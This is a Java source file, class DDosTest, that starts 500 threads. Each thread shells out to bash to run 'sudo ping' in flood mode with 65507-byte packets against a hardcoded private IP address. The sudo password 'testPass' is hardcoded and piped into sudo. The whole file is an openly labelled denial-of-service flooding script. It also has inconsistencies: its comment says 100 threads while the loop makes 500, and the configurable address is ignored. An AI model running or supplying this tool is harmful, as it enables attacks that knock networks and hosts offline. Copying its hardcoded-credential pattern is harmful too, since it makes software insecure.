
public class DDosTest {

    private String ipAddress;

    public DDosTest(String ipAddress) {
        this.ipAddress = ipAddress;
    }

    public String getIpAddress() {
        return ipAddress;
    }

    public void setIpAddress(String ipAddress) {
        this.ipAddress = ipAddress;
    }

    public void startThreads() {
        //Create and start 100 threads
        for (int i = 0; i < 500; i++) {
            DdosThread thread = new DdosThread();
            thread.start();
        }
    }

    public static class DdosThread extends Thread {

        //Change run so that it may continue to ping infinitely until the boolean is set to false
        @Override
        public void run() {
                try {
                    /*Unix specific command prompt - requires superuser to specify the size of the packet being sent,
                    thus the system password is currently hardcoded
                    -s sends a 65507 byte pack, the maximum allowed size for Unix/MacOS
                    -f continuously sends pings without waiting for a reply
                    Java implementation of ping does not allow for altering of packet size / flooding, so we use bash
                     */
                    String ipAddress = "172.28.209.167";
                    String[] cmd = {"/bin/bash", "-c", "echo testPass| sudo -S ping " + ipAddress + " -f -s 65507"};

                    /*Equivalent ping command for Windows
                    -t sends pings until the process is stopped
                    -l sets the buffer size
                    -f continuously sends pings without waiting for a reply
                     */
                    //String[] cmd = {"ping " + ipAddress + " -f -t -l 65500"};
                    attack(cmd);
                } catch (Exception e) {
            }
        }

        private static void attack(String[] cmd) throws Exception {
            /*Run command and wait -- ping command on Windows set to run infinitely (MacOS does this by default), thus
            the process will never exit on the waitFor call, allowing the infinite loop
             */
            Runtime rt = Runtime.getRuntime();
            Process p = rt.exec(cmd);
            p.waitFor();
        }
    }
}